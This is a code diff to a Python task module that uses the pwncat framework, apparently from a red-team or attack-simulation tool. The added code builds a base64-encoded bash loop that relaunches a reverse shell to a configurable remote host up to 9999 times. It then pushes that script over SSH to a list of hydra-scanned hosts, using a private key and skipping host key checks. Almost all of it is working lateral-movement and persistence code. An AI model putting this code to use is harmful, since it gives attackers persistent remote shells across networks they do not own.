@@ -141,10 +141,72 @@ def execute(session: pwncat.manager.Session, task):
             # ideally we determine the key using the ssh_keys archive paths
             # and enumerate? but for now we will have to _cheat_ a little
 
+            # build a payload that attempts reconnect if pid returns non-zero
+            max_attempts = 9999
+            sleep = 30
+            connect_payload = base64.b64encode(f"""
+SCRIPTNAME=pwncat_reconnect
+LOGFILE=/tmp/$SCRIPTNAME.log
+function log {{
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+}}
+MAXLOG=2
+for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{{$i,$((i+1))}} 2>/dev/null || true; done
+mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
+# Max number of attempts to start the Docker container
+max_attempts={max_attempts}
+attempt=0
+
+while true; do
+    # Increment the attempt counter
+    ((attempt++))
+    log "Attempt $attempt of $max_attempts"
+
+    # Try command
+    COMMAND="/bin/bash -c 'TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1'"
+
+    # Start the long-running command using nohup in the background
+    nohup /bin/bash -c "$COMMAND" >/dev/null 2>&1 &
+
+    # Store the Process ID of the background command
+    PID=$!
+
+    # Monitoring loop to check if the process is still running
+    while kill -0 $PID 2>/dev/null; do
+        log "Process $PID is still running..."
+        sleep 10
+    done
+
+    # Wait for the process to finish and capture its exit status
+    wait $PID
+    EXIT_STATUS=$?
+
+    # Check the exit status of the process
+    if [ $EXIT_STATUS -eq 0 ]; then
+        log "Process $PID has completed successfully."
+        break
+    else
+        log "Process $PID has finished with an error."
+    fi
+
+    # Check if maximum attempts have been reached
+    if [[ $attempt -eq $max_attempts ]]; then
+        log "Maximum attempts reached, failing now."
+        exit 1
+    fi
+
+    # Wait for a little while before retrying
+    log "waiting {sleep} seconds..."
+    sleep {sleep}
+done
+
+exit 0
+""".encode("utf-8"))
             payload = base64.b64encode(f'''
-for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk \'/scope global/ {{print $4}}\' | head -1 | awk -F \'/\' \'{{ print $1 }}\')); do 
+for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk \'/scope global/ {{print $4}}\' | head -1 | awk -F \'/\' \'{{ print $1 }}\')); do
     echo "connecting to: $h..."
-    ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key $h "nohup /bin/bash -c 'TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1' >/dev/null 2>&1 &"
+    ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key $h "nohup /bin/bash -c 'echo {connect_payload} | tee /tmp/payload_connect | base64 -d | /bin/bash -' >/dev/null 2>&1 &"
     echo "result: $?"
     echo "connection complete."
 done'''.encode("utf-8"))
